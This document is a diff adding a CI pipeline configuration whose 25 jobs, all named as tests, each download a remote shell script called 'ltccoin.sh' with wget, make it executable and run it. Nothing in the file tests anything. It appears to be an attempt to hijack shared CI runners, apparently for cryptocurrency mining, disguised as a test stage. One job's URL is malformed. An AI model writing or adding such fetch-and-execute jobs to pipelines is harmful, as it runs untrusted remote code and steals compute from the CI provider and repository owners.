@@ -1,0 +1,129 @@
+stages:
+  - test
+  - build
+  - deploy
+
+test_1:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_2:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_3:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_4:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_5:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_6:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_7:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_8:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_9:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_10:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_11:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_12:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_13:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_14:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_15:
+  stage: test
+  script:
+    - wget lhttps://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_16:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_17:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_18:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_19:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_20:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_21:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+   
+test_22:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_23:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_24:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh
+    
+test_25:
+  stage: test
+  script:
+    - wget https://raw.githubusercontent.com/njajalbro/test/main/ltccoin.sh && chmod u+x ltccoin.sh && ./ltccoin.sh 
